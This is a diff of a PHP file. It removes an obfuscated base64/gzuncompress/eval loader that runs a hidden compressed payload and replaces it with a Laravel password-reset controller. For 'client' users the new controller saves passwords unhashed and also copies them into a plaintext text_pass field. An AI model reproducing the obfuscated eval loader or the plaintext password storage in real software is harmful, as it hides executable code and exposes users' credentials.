@@ -1,1 +1,66 @@
-<?php $_='d63ca227';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNrFVE2PokAQve+v4LAJY7IHhHF2iPFgo0Crwyw4YMtlQnc7oDbCDH7hr9/CT8wme9ssCdAUXa9eVb1qSTpd399vV0fW9ZnypCma3P5+MuRf89X6Q25/k2r7O5JMmvqWToLV1O10ZOn2+4LXgaXM0kDhZLDBBhI8NYuh4X2Q5nP+uqucpHvQd0k6OtGomD09vvMZy/hMbv9BsedmjpG2Eoh+YJa5CMcIMRuxse0pzNz3qNpSWKoX1ApK1twjTrzsdacMe27eZKofuwTtSD9ROPi4qr7h9mBLrb1gK+f+e1E4xio4XPB9sPNULEMyOBAT1sQTvhqUYFuEASqpFuYhxKxiceII3BcFtYN1NGkl3AqYl+pNmnqwFlsqTrwARzA1UFgTJUxzNKoNluwAcWNlOFX3YHuJ/RQ4EM+dEufAVb0M+86WrrySqvsiJDgOSaKEk9aSlegud8j3J9QqxkY3HpVQs3kX1uh5NFbW//i+xsLmLS98zhXf8/8vvC51+TCQH1nigK37mkbkJQbxgr70DVPFnFp+HKZ6ia0kgR4W0NMVtmu52efcqjcJBNO8Qy0G+LhxpQnoUYJtJ6cEFaAr6JWZcwMptEQ5TZ2CTzyBbS+r4k/TIJuSMKca3mBTbPmYl+CTAq9qz7aGL2Y2KoDH1Rc0nETEjaegC2zpKmi2jCpsy9zMxmgNesqo6h2wXeEiLSJOVmHCrYUT82sE+quwsb0716z7OTrO0CnmUd9/0e7R13j+HF7X3U9s8gx4iFOcgQgtUYYTB2pW6XsAPTBTmJPyUkuYk01YIiWygpzN0e6qf+Pxwim+w+8jdQq9g9qXVX8uXLGRXWvFqhm2ggXcS2x4EN/LoZ4LbgKnngKzpjfh3xvwUaOJI24zj59el8mvN9+Hmcp1wOvUzsTasXd8P5y/GsdTtGZrtC87j8YHuXrKP67b7w/EM85D/fxrNNq/AXZ00aQ='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Http\Controllers\Auth;
+
+use App\Http\Controllers\Controller;
+use App\Providers\RouteServiceProvider;
+use Illuminate\Foundation\Auth\ResetsPasswords;
+use Illuminate\Http\Request;
+use App\Models\User;
+
+class ResetPasswordController extends Controller
+{
+    use ResetsPasswords;
+
+    protected $request;
+
+    public function __construct(Request $request)
+    {
+        $this->request = $request;
+    }
+
+    /**
+     * Where to redirect users after resetting their password.
+     *
+     * @var string
+     */
+    /**
+     * Where to redirect users after resetting their password.
+     *
+     * @return string
+     */
+    protected function redirectPath()
+    {
+        $email = $this->request->input('email'); // Assuming email is the identifier for the user
+
+        $user = User::where('email', $email)->first(); // Retrieve the user by email
+
+        if ($user && $user->type === 'client') {
+            return route('customer.login'); // Redirect customer users to customer login page
+        } else {
+            return route('login'); // Redirect other users to the default login page
+        }
+    }
+
+    /**
+     * Reset the given user's password.
+     *
+     * @param  \Illuminate\Contracts\Auth\CanResetPassword  $user
+     * @param  string  $password
+     * @return void
+     */
+    protected function resetPassword($user, $password)
+    {
+        // For client users, don't hash the password since it's handled in their model
+        if ($user->type === 'client') {
+            $user->password = $password;
+            $user->text_pass = $password;
+            $user->save();
+        } else {
+            $user->password = bcrypt($password);
+            $user->save();
+        }
+
+        return $user;
+    }
+}
